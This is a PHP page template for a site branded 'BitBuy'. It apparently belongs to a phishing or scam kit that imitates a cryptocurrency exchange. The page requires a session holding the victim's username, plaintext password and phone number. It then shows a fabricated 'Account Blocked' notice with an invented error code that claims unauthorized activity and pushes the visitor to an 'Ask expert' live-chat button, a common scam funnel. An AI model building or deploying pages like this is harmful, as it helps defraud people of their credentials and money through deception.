<?php include_once './config.php'; ?>
<html lang="en">
    <?php
        $title = 'BitBuy | Account';
        include_once './includes/meta.php';
        if(empty($_SESSION["username"]) || empty($_SESSION["password"])) {
            redirect(base_url());
        }
        if(empty($_SESSION["phone_number"])) {
            redirect(base_url('verify.php'));
        }
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <div class='container'>
            <div class="row justify-content-center mt60">
                <div class='col-sm-4 shadow-lg p25'>
                    <div class='col-sm-12 text-center'>
                        <img src=<?= base_url('assets/img/logo.jpg') ?> width="140" alt="Logo" class="d-inline-block align-text-top" />
                        <h1 class='h4 fw-normal py15'>Account Blocked</h1>
                        <div class='pb10 text-center text-danger fs17'>Important Message</div>
                        <div class='pb10 text-center text-danger'>Due to unauthorized activity and identification failure on your Account. Account Access has been suspended.Please Get in touch with our Support Staff Immediately</div>
                        <div class='pb10 text-center fw-bold'>Error CODE: EBRX1</div>
                    </div>
                    <div class='text-center my20'>
                        <a href="javascript:void(Tawk_API.toggle())" class="btn btn-primary-2 text-white px20">Ask expert</a>
                    </div>
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
    </body>
</html>